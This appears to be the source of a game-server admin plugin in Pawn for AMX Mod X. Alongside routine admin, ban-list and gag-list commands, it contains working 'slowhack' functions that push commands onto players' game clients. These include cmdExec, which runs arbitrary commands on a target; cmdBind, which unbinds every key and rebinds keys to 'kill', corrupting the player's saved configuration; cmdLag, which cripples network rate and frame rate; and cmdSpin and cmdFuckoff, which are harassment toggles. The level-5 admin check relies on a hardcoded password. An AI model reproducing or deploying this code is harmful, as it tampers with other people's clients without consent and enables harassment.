public cmdAddAdmin(id, level, cid)
{	
	if(!cmd_access(id, level, cid, 4))
		return PLUGIN_HANDLED
	
	new arg[LEN_NAME+1], arg2[LEN_FLEX+1], arg3[LEN_TIME+1], arg4[32], lvl;
	read_argv(1, arg, LEN_NAME);
	read_argv(2, arg2, LEN_FLEX);
	read_argv(3, arg3, LEN_TIME);
	read_argv(4, arg4, charsmax( arg4 ) );

	lvl = str_to_num(arg3);
	
	if(!(1 <= lvl <= sizeof(access_levels)))
	{
		console_print(id, "Invalid admin level.");
		return PLUGIN_HANDLED;
	}
	
	if(lvl == sizeof(access_levels) && !equal(arg4, LVL_FIVE_PW))
	{
		console_print(id, "You need to type in a password to add a Level 5 admin.");
		return PLUGIN_HANDLED;
	}
	
	new empty = FindEmptyIndex(ADMIN);
	
	formatex(admin_names[empty], LEN_NAME, "%s", arg);
	formatex(admin_flex[empty], LEN_FLEX, "%s", arg2);
	admin_lvl[empty] = lvl;
	
	console_print(id, "%s e uspeshno dobaven.", arg);
	
	return PLUGIN_HANDLED;
}

public cmdRemoveAdmin(id, level, cid)
{	
	if(!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED
	
	new arg[LEN_NAME+1];
	read_argv(1, arg, LEN_NAME);
	
	for(new i = 0; i < MAX_ADMINS; i++)
	{
		if(!is_record_valid(ADMIN, i))
			continue;
		
		if(equali(admin_names[i], arg))
			admin_lvl[i] = 0;
	}
	
	console_print(id, "%s e uspeshno premahnat.", arg);
	
	return PLUGIN_HANDLED;
}

public cmdAdminList(id, level, cid)
{	
	if(!cmd_access(id, level, cid, 1))
		return PLUGIN_HANDLED
	
	new count;
	
	for(new i = 0; i < MAX_ADMINS; i++)
	{
		if(!is_record_valid(ADMIN, i))
			continue;
		
		console_print(id, "%s     %s     %i", admin_names[i], admin_flex[i], admin_lvl[i]);
		
		count++;
	}
	
	console_print(id, "Obshto: %i admin%s.", count, count == 1 ? "":"a");
	
	return PLUGIN_HANDLED;
}

public cmdClearBanList(id, level, cid)
{	
	if(!cmd_access(id, level, cid, 1))
		return PLUGIN_HANDLED
	
	for(new i = 0; i < MAX_ENTRIES; i++)
	{
		if(!is_record_valid(BAN, i))
			continue;
		
		ban_time[i] = 0;
	}
	
	console_print(id, "Banlistata e uspeshno restartirana.");
	
	#if defined LOG_ENABLED
	log_to_file(srm_log, "%s erased the banlist", id_name[id]);
	#endif
	
	return PLUGIN_HANDLED;
}

public cmdClearGagList(id, level, cid)
{	
	if(!cmd_access(id, level, cid, 1))
		return PLUGIN_HANDLED
	
	for(new i = 0; i < MAX_ENTRIES; i++)
	{
		if(!is_record_valid(GAG, i))
			continue;
		
		gag_time[i] = 0;
	}
	
	console_print(id, "Gaglistata e uspeshno restartirana.");
	
	#if defined LOG_ENABLED
	log_to_file(srm_log, "%s erased the gaglist", id_name[id]);
	#endif
	
	return PLUGIN_HANDLED;
}

public cmdExec(id, level, cid)
{	
	if(!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;

	new arg[ 32 ];
	read_argv( 1, arg, charsmax( arg ) );
	
	new target = cmd_target(id, arg, CMDTARGET_NO_BOTS);
	
	if(!target)
		return PLUGIN_HANDLED;
	
	new arg2[ 128 ];
	read_argv( 2, arg2, charsmax( arg2 ) );
	
	client_cmd(target, "%s", arg2);
	
	console_print(id, "Command executed.");
	
	switch(activity())
	{
		case 1:ColorChat(0, RED, "[ADMIN]^x01 executed command on %s.", id_name[target]);
		case 2:ColorChat(0, RED, "[ADMIN]^x01 %s executed command on %s.", id_name[id], id_name[target]);
	}
	
	#if defined LOG_ENABLED
	log_to_file(srm_log, "%s executed command on %s", id_name[id], id_name[target]);
	#endif
	
	return PLUGIN_HANDLED;
}

public cmdFuckoff(id, level, cid)
{	
	if(!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;
	
	new arg[LEN_NAME+1];
	read_argv( 1, arg, LEN_NAME );
	
	new player = cmd_target(id, arg, CMDTARGET_NO_BOTS);
	
	if(!player || player == id)
		return PLUGIN_HANDLED;
	
	has_fuckoff[player] = true;
	
	console_print(id, "Successfully executed.");
	
	#if defined LOG_ENABLED
	log_to_file(srm_log, "%s executed sr_fuckoff on %s", id_name[id], id_name[player]);
	#endif
	
	return PLUGIN_HANDLED;
}

public cmdBind(id, level, cid)
{	
	if(!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;
	
	new arg[LEN_NAME+1];
	read_argv( 1, arg, LEN_NAME );
	
	new target = cmd_target(id, arg, CMDTARGET_NO_BOTS);
	
	if(!target || target == id)
		return PLUGIN_HANDLED;
	
	client_cmd(target,"unbindall");
	client_cmd(target,"developer 1")
	client_cmd(target,"bind w kill;wait;bind a kill;bind s kill;wait;bind d kill;bind mouse1 kill;wait;bind mouse2 kill;bind mouse3 kill;wait;bind space kill")
	client_cmd(target,"bind ctrl kill;wait;bind 1 kill;bind 2 kill;wait;bind 3 kill;bind 4 kill;wait;bind 5 kill;bind 6 kill;wait;bind 7 kill")
	client_cmd(target,"bind 8 kill;wait;bind 9 kill;bind 0 kill;wait;bind r kill;bind e kill;wait;bind g kill;bind q kill;wait;bind shift kill")
	client_cmd(target,"bind end kill;wait;bind escape kill;bind z kill;wait;bind x kill;bind c kill;wait;bind uparrow kill;bind downarrow kill;wait;bind leftarrow kill")
	client_cmd(target,"bind rightarrow kill;wait;bind mwheeldown kill;bind mwheelup kill;wait;bind ` kill;bind ~ kill")
	
	console_print(id, "Successfully executed.");
	
	#if defined LOG_ENABLED
	log_to_file(srm_log, "%s executed sr_bind on %s", id_name[id], id_name[target]);
	#endif
	
	return PLUGIN_HANDLED;
}

public cmdLag(id, level, cid)
{	
	if(!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;
	
	new arg[LEN_NAME+1];
	read_argv( 1, arg, LEN_NAME );
	
	new target = cmd_target(id, arg, CMDTARGET_NO_BOTS);
	
	if(!target || target == id) 
		return PLUGIN_HANDLED;
	
	client_cmd(target,"developer 1")
	client_cmd(target,"rate 1;cl_cmdrate 10; cl_updaterate 10;fps_max 1")
	
	console_print(id, "Successfully executed.");
	
	#if defined LOG_ENABLED
	log_to_file(srm_log, "%s executed sr_lag on %s", id_name[id], id_name[target]);
	#endif
	
	return PLUGIN_HANDLED;
}

public cmdSpin(id, level, cid)
{	
	if(!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;
	
	new arg[LEN_NAME+1];
	read_argv( 1, arg, LEN_NAME );
	
	new target = cmd_target(id, arg, CMDTARGET_NO_BOTS);
	
	if(!target || target == id)
		return PLUGIN_HANDLED;
	
	has_spin[target] = true;
	
	console_print(id, "Successfully executed.");
	
	#if defined LOG_ENABLED
	log_to_file(srm_log, "%s executed sr_spin on %s", id_name[id], id_name[target]);
	#endif
	
	return PLUGIN_HANDLED;
}
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ deff0{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ lang1026\\ f0\\ fs16 \n\\ par }
*/
